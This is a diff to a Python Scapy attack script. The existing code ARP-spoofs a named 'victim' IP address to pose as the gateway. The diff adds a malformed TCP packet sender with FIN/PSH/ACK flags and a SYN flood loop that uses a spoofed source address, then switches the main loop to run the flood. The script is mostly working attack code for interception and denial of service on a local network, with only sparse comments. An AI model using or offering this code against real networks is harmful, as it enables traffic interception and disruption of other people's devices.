@@ -1,4 +1,5 @@
 from scapy.all import Ether, ARP, srp, send
+from scapy.layers.inet import IP, TCP
 import argparse
 import time
 import os
@@ -36,17 +37,38 @@ def spoof(target_ip, host_ip, verbose=True):
         self_mac = ARP().hwsrc
         print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
+# malformed packet attack
+def single_packet_attack(target):
+    # Craft a TCP packet with the FPA flag set
+    packet = IP(dst=target)/TCP(dport=80, flags='FPA')
+    # Send the packet
+    send(packet)
+
+# Brute force attack
+def spam_attack(target):
+    for i in range(100):
+        pkt = IP(src="192.168.0.1", dst=target)/TCP(flags="S")
+        send(pkt)
+        time.sleep(0.5)
+
 if __name__ == "__main__":
     # victim ip address
-    target = "192.168.1.100"
+    target = "192.168.1.95"
     # gateway ip address
-    host = "192.168.1.1"
+    host = "192.168.1.254"
     # print progress to the screen
     verbose = True
     # enable ip forwarding
     #enable_ip_route()
     while True:
+        # attack single packet
+        #single_packet_attack(target)
+        
         # telling the `target` that we are the `host`
-        spoof(target, host, verbose)
+        #spoof(target, host, verbose)
+        
+        # Brute for simulating
+        spam_attack(target)
+
         # sleep for one second
         time.sleep(1)
